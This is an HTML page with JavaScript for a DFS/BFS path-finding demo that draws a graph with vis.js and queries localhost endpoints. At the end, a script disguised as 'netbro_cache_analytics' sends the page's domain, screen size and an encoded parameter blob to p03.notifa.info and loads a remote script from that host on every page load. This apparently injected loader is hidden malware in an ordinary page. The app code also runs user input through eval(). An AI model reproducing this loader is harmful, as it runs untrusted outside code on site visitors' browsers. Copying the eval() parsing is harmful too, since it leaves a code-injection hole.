<!doctype html>
<html>
<head>
    <title>DFS and BFS</title>

    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/vis/4.21.0/vis.min.js"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/vis/4.21.0/vis.min.css" rel="stylesheet" type="text/css" />
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css" integrity="sha384-9gVQ4dYFwwWSjIDZnLEWnxCjeSWFphJiwGPXr1jddIhOegiu1FwO5qRGvFXOdJZ4" crossorigin="anonymous">
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>
    <script src="https://code.jquery.com/jquery-3.3.1.min.js" integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous"></script>

    <style type="text/css">

        #map {
            width: 600px;
            height: 400px;
            border: 1px solid lightgray;
        }

    </style>
</head>
<body>

<div class="row">
    <div class="col-lg-12 header">
        <h2 align="center">
            Searching path using DFS and BFS
        </h2>
    </div>
</div>
<div class="row">
    <div class="col-lg-6">
        <div class="row">
            <div class="col-lg-12" id="map"></div>
        </div>
        <div class="row">
            <div class="col-lg-12">
                <label for="path">Path:</label>
                <input type="text" class="form-control" id="path">
            </div>
        </div>
    </div>
    <div class="col-lg-6 input">
        <div class="row">
            <div class="col-lg-1"></div>
            <div class="col-lg-5">
                <form action="#">
                    <div class="form-group">
                        <label for="node">Node:</label>
                        <textarea class="form-control" rows="4" id="node">[
 {id: 1, label: 'A'},
 {id: 2, label: 'B'},
 {id: 3, label: 'C'},
 {id: 4, label: 'D'},
 {id: 5, label: 'E'},
 {id: 6, label: 'F'},
 {id: 7, label: 'G'},
 {id: 8, label: 'H'},
 {id: 9, label: 'I'},
 {id: 10, label: 'J'},
 {id: 11, label: 'K'},
 {id: 12, label: 'L'},
]

                        </textarea>
                    </div>
                    <div class="form-group">
                        <label for="edges">Edges:</label>
                        <textarea class="form-control" rows="4" id="edges">[
{from: 1, to: 2},
{from: 2, to: 1},
{from: 2, to: 3},
{from: 3, to: 2},
{from: 3, to: 4},
{from: 3, to: 8},
{from: 3, to: 9},
{from: 4, to: 3},
{from: 4, to: 5},
{from: 4, to: 6},
{from: 4, to: 8},
{from: 5, to: 4},
{from: 6, to: 4},
{from: 6, to: 7},
{from: 7, to: 6},
{from: 7, to: 8},
{from: 8, to: 4},
{from: 8, to: 3},
{from: 8, to: 7},
{from: 8, to: 12},
{from: 9, to: 3},
{from: 9, to: 10},
{from: 9, to: 11},
{from: 10, to: 9},

{from: 11, to: 9},
{from: 12, to: 11},
{from: 12, to: 8},
]</textarea>
                    </div>
                    <div class="form-group">
                        <label for="start">Start:</label>
                        <input type="text" class="form-control" id="start">
                    </div>
                    <div class="form-group">
                        <label for="dest">Destination:</label>
                        <input type="text" class="form-control" id="dest">
                    </div>
                    <button id="dfs" class="btn btn-default">DFS</button>
                    <button id="bfs" class="btn btn-default">BFS</button>
                    <button id="load" class="btn btn-default">Load</button>
                    <button id="delete" class="btn btn-default">Delete</button>
                </form>
            </div>
            <div class="col-lg-5">
                <label for="graph">Graph :</label>
                <textarea class="form-control" id="graph" rows="20"> </textarea>
            </div>
            <div class="col-lg-1"></div>
        </div>
    </div>
</div>



<script type="text/javascript">

    $(document).ready(function(){
        let nodes = eval($('textarea#node').val());
        let edges = eval($('textarea#edges').val());
        // create a network
        var container = document.getElementById('map');
        var data = {
            nodes: nodes,
            edges: edges
        };
        var options = {
            nodes: {
                shape: 'circle'
            }
        };
        var network = new vis.Network(container, data, options);
        $('#delete').click(function () {
            network.destroy();
        });
        $("#load").click(function(){


            let nodes = eval($('textarea#node').val());
            let edges = eval($('textarea#edges').val());
            let map = getPath(nodes,edges);
            $('#graph').val(JSON.stringify(JSON.parse(map)));
            // create a network
            // console.log(eval(nodes));
            var container = document.getElementById('map');
            var data = {
                nodes: nodes,
                edges: edges
            };
            var options = {
                nodes: {
                    shape: 'circle'
                }
            };
            var network = new vis.Network(container, data, options);

        });
        $("#dfs").click(function () {
            let nodes = eval($('textarea#node').val());
            let edges = eval($('textarea#edges').val());
            let map = convert(nodes,edges);
            $("#graph").val(JSON.stringify(JSON.parse(map),null,"\t"));
            let start = $('#start').val();
            let dest = $('#dest').val();
            let startId=(nodes.find(o=>o.label === start));
            let destId=(nodes.find(o=>o.label === dest));
            var path;
            var data = {
                peta : map,
                start : startId.id,
                destination : destId.id
            };

            $.ajax({
                type: "POST",
                url:"http://localhost:3000/dfs",
                data: data,
                contentType : "application/x-www-form-urlencoded; charset=UTF-8",
                success: function (result) {
                    path = result;
                },
                error : function (err) {
                    alert("case sensitife")
                },
                async: false
            });
            $('#path').val(function () {
                var p=[];
                for(var i of nodes){
                    for(var j of path){
                        if(j == i.id){
                            p.push(i.label)
                        }
                    }
                }
                return p;
            });
            data = changeColor(path,nodes,edges);


            var container = document.getElementById('map');

            var options = {
                nodes: {
                    shape: 'circle',
                },
                edges:{
                    color: {
                        inherit:false
                    }
                },
            };
            var network = new vis.Network(container, data, options);
        });
        $("#bfs").click(function () {
            let nodes = eval($('textarea#node').val());
            let edges = eval($('textarea#edges').val());
            let map = convert(nodes,edges);
            $("#graph").val(JSON.stringify(JSON.parse(map),null,"\t"));
            let start = $('#start').val();
            let dest = $('#dest').val();
            let startId=(nodes.find(o=>o.label === start));
            let destId=(nodes.find(o=>o.label === dest));
            var path;
            var data = {
                peta : map,
                start : startId.id,
                destination : destId.id
            };
            console.log("eror");
            $.ajax({
                type: "POST",
                url:"http://localhost:3000/bfs",
                data: data,
                contentType : "application/x-www-form-urlencoded; charset=UTF-8",
                success: function (result) {
                    path = result;
                },
                error : function (err) {
                    alert("case sensitife")
                },
                async: false
            });
            $('#path').val(function () {
                var p=[];
                for(var i of nodes){
                    for(var j of path){
                        if(j == i.id){
                            p.push(i.label)
                        }
                    }
                }
                return p;
            });
            data = changeColor(path,nodes,edges);


            var container = document.getElementById('map');

            var options = {
                nodes: {
                    shape: 'circle',
                },
                edges:{
                    color: {
                        inherit:false
                    }
                },
            };
            var network = new vis.Network(container, data, options);
        });
    });

    function changeColor(path,node,edges) {
        var count=0;
        for(var i in node){
            for(var j in path){
                if(path[j]==node[i].id){
                    node[i].color="red";

                }
            }
        }
        for(var i in edges){
            for(var j in path){
                if(edges[i].from==path[j]&&edges[i].to==path[parseInt(j)+1]){
                    edges[i].color = {color:'red'};
                }

            }
        }
        return {nodes: node,edges:edges };
    }

    function convert(nodes,edges) {
        var obj={};
        var arr=[];
        var arr2=[];
        for(var i in nodes){
            //obj={}
            arr2=[];
            for(var j in edges){
                if(nodes[i].id==edges[j].from){
                    arr2.push(edges[j].to);
                }
            }
            obj[nodes[i].id] = arr2.map(String);
            arr.push(obj);
        }
        return JSON.stringify(obj);
    }
    function getPath(nodes,edges) {
        var obj={};
        var arr=[];
        var arr2=[];

        for(var i in nodes){
            //obj={}
            arr2=[];
            for(var j in edges){
                if(nodes[i].id==edges[j].from){
                    // arr2.push(edges[j].to);
                    // console.log( edges[j].to);
                    // console.log(nodes[edges[j].from]['label']);
                    if (typeof nodes[edges[j].to] !== 'undefined') {
                        // variable is undefined
                        arr2.push(nodes[edges[j].to-1].label);
                    }
                    for (var k in nodes){
                        if(edges[j].to==nodes[i].id){
                            console.log( edges[j].to);
                        }
                    }
                }
            }


            obj[nodes[i].label] = arr2.map(String);
            arr.push(obj);
        }
        return JSON.stringify(obj);
    }
</script>


<script type = "text/javascript" >
    if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function() {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mtpcUh5HWK29hiymp%2fYv11L3axdUscbIlf8r1pAVeNpXra1n7lonHneQPEc7xgEr5fMDSRkzAY4Sv01JCxKyQyEtYPLMaP9wNqH%2fsULKk2mhLpIYs3nCUelCdtS0ovcuOGwsrXtXCpSzP7bQ408w7pUK2zlEuePspTx2%2bWOkCKeqRTmOly6%2bfAurq8whU%2fnkvwVtVLSxE7lqqKWpL%2bPoe3hL6FkQYgQatU9sDsLUB6tL1OtRTNYYbYaE7nzfKWBemH7Hfbfl5WbKH3axxQmIFtBBhIRmMLI7N1Bwgnl9FThtEx7jTQ2D1FNJrvaUK7vTYRhGbHS22XEbUgtX1l4uv6ToLDuQ5q8it5YXqsPPcqjtBKRwoGg68kGQkwmkDls3AhDNT0o3936r113W%2fQxPaP5c%2f4%2bw8o2ox9p4QHnSCv79mp3WZnoHyJZVH6uCuixK5Eluhk7qgufA%2b9Xk3PKTUUHZnQuVej0eEviIzhkcORiAZu3C4P0KUS%2fEGRkssOn4M8weCL9KucrDhkUtoPQD1cQ%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }
        netbro_cache_analytics(requestCfs, function() {});
    };
</script>

</body >
</html>
